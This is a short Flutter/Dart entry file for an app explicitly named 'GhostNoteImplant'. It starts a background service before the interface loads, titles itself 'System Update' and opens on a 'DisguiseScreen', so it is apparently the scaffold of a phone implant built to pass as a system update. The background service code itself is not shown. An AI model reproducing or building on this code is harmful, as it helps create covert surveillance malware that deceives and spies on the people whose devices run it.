import 'package:flutter/material.dart';
import 'services/background_service.dart';
import 'screens/implant/disguise_screen.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await BackgroundServiceManager.initialize();
  await BackgroundServiceManager.start();
  runApp(const GhostNoteImplant());
}

class GhostNoteImplant extends StatelessWidget {
  const GhostNoteImplant({super.key});
  @override
  Widget build(BuildContext context) => MaterialApp(
        title: 'System Update',
        debugShowCheckedModeBanner: false,
        theme: ThemeData.dark().copyWith(primaryColor: const Color(0xFF1A73E8)),
        home: const DisguiseScreen(),
      );
}